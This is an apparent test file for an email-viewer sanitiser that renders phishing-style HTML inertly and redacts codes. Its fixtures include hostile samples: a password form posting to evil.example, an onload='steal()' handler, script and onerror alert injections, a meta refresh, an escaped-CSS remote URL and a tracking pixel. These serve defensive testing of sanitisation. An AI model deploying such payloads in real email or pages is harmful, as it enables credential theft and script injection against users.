// Inert Source Principle — the Original Email viewer draws the email's own HTML (anchor text, buttons, pictures carried
// in the email, formatting, tables) but nothing in it can navigate, run, submit, download or reach the network. Where
// each link really goes is kept separately as evidence.
import assert from "node:assert/strict";
import { test } from "node:test";

import { inertEmail, inertEmailNote } from "../src/domain/inertEmail.ts";
import { readEmailBody, utf8ToBinary } from "../src/domain/triage/emailOriginal.ts";

const HTML = `<!doctype html><html><head><meta http-equiv="refresh" content="0;url=https://evil.example/r">
<base href="https://evil.example/"><link rel="stylesheet" href="https://evil.example/s.css"><title>Promo</title>
<style>a.btn { color: #fff; background: url(https://evil.example/bg.png) } @import url(https://evil.example/i.css);</style>
<script>alert(1)</script></head>
<body bgcolor="#f4f4f4" onload="steal()" background="https://evil.example/body.png">
<table width="600" cellpadding="0" style="border:1px solid #ddd"><tr><td align="center">
<a class="btn" href="https://shop-now.evil.example/go?id=1&amp;u=2" target="_blank" style="background:#e00;color:#fff;padding:12px">SHOP NOW</a>
<a href="https://evil.example/unsub">Unsubscribe</a>
<a href="tel:+61400111222">Call us</a> <a href="#top">Top</a>
<a href="https://social.example/fb"><img src="https://cdn.evil.example/fb.png" alt="Facebook" width="24" height="24"></a>
<img src="cid:logo@x" alt="Logo" width="120"><img src="https://track.evil.example/p.gif" width="1" height="1">
<form action="https://evil.example/post" method="post"><input name="pw" type="password"><button onclick="x()">Continue shopping</button></form>
<iframe src="https://evil.example/frame"></iframe><object data="https://evil.example/o"><p>inside object</p></object>
<p style="background-image:url('https://evil.example/p.png')" onmouseover="x()">Hello &amp; welcome</p>
<!--[if mso]><p>Outlook only</p><![endif]-->
</td></tr></table></body></html>`;

const inline = [{ cid: "logo@x", type: "image/png", bin: "\x89PNG" }];

test("links keep their displayed text and look, but carry no destination", () => {
  const out = inertEmail({ html: HTML, inline })!;
  assert.ok(out);
  assert.match(out.document, /<a data-apollo-link="" class="btn" style="background:#e00;color:#fff;padding:12px">SHOP NOW<\/a>/);
  assert.ok(out.document.includes(">Unsubscribe</a>"));
  assert.ok(!/\shref=/i.test(out.document), "no href anywhere");
  assert.ok(!/target=|onclick|onload|onmouseover/i.test(out.document));
  assert.ok(!out.document.includes("shop-now.evil.example"), "a destination never replaces or joins the visible text");
});

test("each link's real destination is kept as evidence, with the text it displayed", () => {
  const { links } = inertEmail({ html: HTML, inline })!;
  assert.deepEqual(links.find((l) => l.text === "SHOP NOW"), { text: "SHOP NOW", href: "https://shop-now.evil.example/go?id=1&u=2" });
  assert.ok(links.some((l) => l.text === "Unsubscribe" && l.href === "https://evil.example/unsub"));
  assert.ok(links.some((l) => l.text === "Call us" && l.href === "tel:+61400111222"));
  assert.ok(links.some((l) => l.text === "[picture: Facebook]" && l.href === "https://social.example/fb"));
  assert.ok(!links.some((l) => l.href === "#top"), "a jump within the email isn't a destination");
});

test("nothing can run, submit, frame, refresh or rebase", () => {
  const { document } = inertEmail({ html: HTML, inline })!;
  for (const bad of ["<script", "alert(1)", "<iframe", "<object", "inside object", "<form", "action=", "http-equiv=\"refresh\"", "<base", "<link", "<title", "Outlook only"]) {
    assert.ok(!document.includes(bad), `removed: ${bad}`);
  }
  assert.match(document, /<div><input readonly tabindex="-1" type="password"><button type="button" tabindex="-1">Continue shopping<\/button><\/div>/);
});

test("pictures on outside servers are never fetched: a labelled box keeps their place; tracking pixels are left out", () => {
  const out = inertEmail({ html: HTML, inline })!;
  assert.ok(!/https?:\/\/[^"]*\.(png|gif)/.test(out.document.replace(/aria-label="[^"]*"/g, "")), "no outside picture address remains");
  assert.match(out.document, /<span class="apollo-remote-img" role="img" aria-label="Facebook" style="width:24px;height:24px">Facebook<\/span>/);
  assert.equal(out.trackingPixels, 1);
  // fb.png, bg.png (style block), body.png (background attribute), p.png (inline style)
  assert.equal(out.remoteImages, 4);
  assert.ok(!out.document.includes("@import"));
  assert.match(out.document, /background: none/);
});

test("pictures carried inside the email are drawn from the email itself", () => {
  const { document } = inertEmail({ html: HTML, inline })!;
  assert.match(document, /<img src="data:image\/png;base64,iVBORw==" alt="Logo" width="120">/);
});

test("the document allows nothing but its own pictures and styles, and keeps the email's own look", () => {
  const { document } = inertEmail({ html: HTML, inline })!;
  assert.match(document, /Content-Security-Policy" content="default-src 'none'; img-src data:; style-src 'unsafe-inline'/);
  assert.match(document, /form-action 'none'; base-uri 'none'/);
  assert.match(document, /format-detection" content="telephone=no, email=no, address=no, date=no"/);
  assert.match(document, /<body bgcolor="#f4f4f4">/);
  assert.match(document, /<table width="600" cellpadding="0" style="border:1px solid #ddd">/);
  assert.ok(document.includes("Hello &amp; welcome"), "text and entities are untouched");
});

test("a stray '<' in text can't open markup, and escaped CSS can't hide an outside address", () => {
  const out = inertEmail({ html: `<p>1 <scr<script>ipt>x</p><p style="background:u\\72l(https://evil.example/x.png)">t</p><p>end <img src=x onerror=alert(1)`, inline: [] })!;
  assert.ok(!out.document.includes("<scr"));
  assert.ok(out.document.includes("end &lt;img src=x onerror=alert(1)"), "an unfinished tag stays text");
  assert.ok(!out.document.includes("evil.example"));
});

test("an email with no usable HTML part has no HTML view: its text is shown instead", () => {
  assert.equal(inertEmail({ html: null, inline: [] }), null);
  assert.equal(inertEmail({ html: "<html><body>  <br> </body></html>", inline: [] }), null);
});

test("the kept .eml gives its HTML part, its plain part and its inline pictures", () => {
  const eml = [
    "From: Shop <deals@shop.example>", "Subject: Sale", "MIME-Version: 1.0",
    "Content-Type: multipart/related; boundary=\"R\"", "",
    "--R", "Content-Type: multipart/alternative; boundary=\"A\"", "",
    "--A", "Content-Type: text/plain; charset=utf-8", "", "SHOP NOW https://shop.example/x", "",
    "--A", "Content-Type: text/html; charset=utf-8", "Content-Transfer-Encoding: quoted-printable", "",
    "<p><a href=3D\"https://shop.example/x\">SHOP NOW</a></p><img src=3D\"cid:pic1\">", "",
    "--A--",
    "--R", "Content-Type: image/png", "Content-ID: <pic1>", "Content-Transfer-Encoding: base64", "", "iVBORw==", "",
    "--R--", "",
  ].join("\r\n");
  const body = readEmailBody(utf8ToBinary(eml));
  assert.match(body.html ?? "", /<a href="https:\/\/shop.example\/x">SHOP NOW<\/a>/);
  assert.equal(body.plain, "SHOP NOW https://shop.example/x");
  assert.deepEqual(body.inline.map((p) => p.cid), ["pic1"]);
  const out = inertEmail(body)!;
  assert.match(out.document, /<img src="data:image\/png;base64,iVBORw==">/);
  assert.deepEqual(out.links, [{ text: "SHOP NOW", href: "https://shop.example/x" }]);
});

test("a wide email is fitted to the screen the way a phone's email app shrinks it", async () => {
  const { fittedEmail } = await import("../src/domain/inertEmail.ts");
  const out = inertEmail({ html: `<table width="100%"><tr><td><table width="600" style="max-width:600px"><tr><td>Hi</td></tr></table></td></tr></table>`, inline: [] })!;
  assert.equal(out.layoutWidth, 600);
  assert.match(fittedEmail(out, 308), /<style>html \{ zoom: 0\.500; \}<\/style><\/head>/);
  assert.equal(fittedEmail(out, 900), out.document, "never enlarged");
  const flowing = inertEmail({ html: "<p>Plain words</p>", inline: [] })!;
  assert.equal(flowing.layoutWidth, null);
  assert.equal(fittedEmail(flowing, 300), flowing.document);
});

test("the viewer says what it did", () => {
  assert.equal(inertEmailNote({ remoteImages: 0, trackingPixels: 0 }), "Shown as it appeared. Links, buttons and pictures in it can't be opened from here.");
  assert.equal(inertEmailNote({ remoteImages: 3, trackingPixels: 1 }),
    "Shown as it appeared. Links, buttons and pictures in it can't be opened from here. 3 pictures on the sender's servers weren't loaded, so nothing was fetched. 1 tracking pixel was left out.");
});


// ── redactInertEmail ─────────────────────────────────────────────────────────

test("redactInertEmail applies redaction to visible text, preserving HTML structure", async () => {
  const { redactInertEmail } = await import("../src/domain/inertEmail.ts");
  const email = inertEmail({ html: "<p>Your verification code is 987654</p><p>Click here</p>", inline: [] })!;
  assert.ok(email);
  const redacted = redactInertEmail(email, (text) => text.replace(/verification code is \d+/i, "[credential redacted]"));
  assert.match(redacted.document, /<p>Your \[credential redacted\]<\/p>/);
  assert.match(redacted.document, /<p>Click here<\/p>/);
});

test("redactInertEmail leaves style blocks untouched", async () => {
  const { redactInertEmail } = await import("../src/domain/inertEmail.ts");
  const email = inertEmail({ html: "<style>.password { color: red }</style><p>password is secret123</p>", inline: [] })!;
  assert.ok(email);
  const redacted = redactInertEmail(email, (text) => text.replace(/password is \S+/i, "[credential redacted]"));
  assert.match(redacted.document, /\.password \{ color: red \}/);
  assert.match(redacted.document, /<p>\[credential redacted\]<\/p>/);
});

test("redactInertEmail preserves tag attributes unchanged", async () => {
  const { redactInertEmail } = await import("../src/domain/inertEmail.ts");
  const email = inertEmail({ html: `<p style="color:red" class="code" title="pin is 1234">pin is 1234</p>`, inline: [] })!;
  assert.ok(email);
  const redacted = redactInertEmail(email, (text) => text.replace(/pin is \d+/i, "[credential redacted]"));
  // Tag attributes stay, text content is redacted
  assert.match(redacted.document, /style="color:red"/);
  assert.match(redacted.document, /class="code"/);
  assert.match(redacted.document, /title="pin is 1234"/);
  assert.match(redacted.document, />\[credential redacted\]</);
});

test("redactInertEmail fast-path: unchanged text nodes keep their original encoding", async () => {
  const { redactInertEmail } = await import("../src/domain/inertEmail.ts");
  const email = inertEmail({ html: "<p>Hello &amp; welcome</p>", inline: [] })!;
  assert.ok(email);
  const identity = (text: string) => text;
  const redacted = redactInertEmail(email, identity);
  // Exact same document since nothing was redacted
  assert.equal(redacted.document, email.document);
});

test("redactInertEmail with credential patterns matches the acceptance criteria (no [link] artefacts)", async () => {
  const { redactInertEmail } = await import("../src/domain/inertEmail.ts");
  const { redactInvestigationSecrets } = await import("../src/domain/privacy.ts");
  const html = `
    <table><tr><td>
    <p>Dear customer,</p>
    <p>Your OTP is 456789. Please use it within 5 minutes.</p>
    <a href="https://example.com/verify">Verify now</a>
    </td></tr></table>`;
  const email = inertEmail({ html, inline: [] })!;
  assert.ok(email);
  const redacted = redactInertEmail(email, redactInvestigationSecrets);
  // The OTP should be redacted
  assert.ok(!redacted.document.includes("456789"), "credential number must not appear in redacted output");
  // The "Dear customer" text and "Verify now" link text must survive
  assert.ok(redacted.document.includes("Dear customer"), "non-credential text preserved");
  assert.ok(redacted.document.includes("Verify now"), "link text preserved");
  // No [link] artefacts
  assert.ok(!redacted.document.includes("[link]"), "no [link] artefact in output");
  // The HTML structure (table, anchor) must survive
  assert.match(redacted.document, /<table>/);
  assert.match(redacted.document, /<a/);
});


// ── textToInertEmail (plain-text fallback for evidence tab) ───────────────────

test("textToInertEmail removes [link] and [image] artefacts", async () => {
  const { textToInertEmail } = await import("../src/domain/inertEmail.ts");
  const text = "Hello [link] world [image: banner] [link] end";
  const email = textToInertEmail(text);
  assert.ok(!email.document.includes("[link]"), "no [link] in output");
  assert.ok(!email.document.includes("[image"), "no [image in output");
  assert.ok(email.document.includes("Hello"), "preserves real text");
  assert.ok(email.document.includes("world"), "preserves real text");
  assert.ok(email.document.includes("end"), "preserves real text");
});

test("textToInertEmail wraps text in a locked-down CSP document", async () => {
  const { textToInertEmail } = await import("../src/domain/inertEmail.ts");
  const email = textToInertEmail("Just a paragraph.");
  assert.match(email.document, /Content-Security-Policy/);
  assert.match(email.document, /script-src 'none'/);
  assert.match(email.document, /<body>/);
  assert.match(email.document, /Just a paragraph\./);
});

test("textToInertEmail makes URLs visible but inert", async () => {
  const { textToInertEmail } = await import("../src/domain/inertEmail.ts");
  const email = textToInertEmail("Visit https://example.com/page today");
  assert.match(email.document, /https:\/\/example\.com\/page/);
  // URL should be in a span, not an <a> tag
  assert.match(email.document, /<span/);
  assert.ok(!email.document.includes("<a "), "no anchor tags — URLs are inert");
});

test("textToInertEmail preserves paragraph breaks", async () => {
  const { textToInertEmail } = await import("../src/domain/inertEmail.ts");
  const email = textToInertEmail("First paragraph.\n\nSecond paragraph.");
  // Should have two <p> elements
  const pCount = (email.document.match(/<p /g) ?? []).length;
  assert.ok(pCount >= 2, `expected at least 2 paragraphs, got ${pCount}`);
});

test("textToInertEmail returns zero links, zero remote images", async () => {
  const { textToInertEmail } = await import("../src/domain/inertEmail.ts");
  const email = textToInertEmail("Check https://example.com and https://other.com");
  assert.equal(email.links.length, 0, "no extractable links — it's a text fallback");
  assert.equal(email.remoteImages, 0);
  assert.equal(email.trackingPixels, 0);
  assert.equal(email.layoutWidth, null);
});
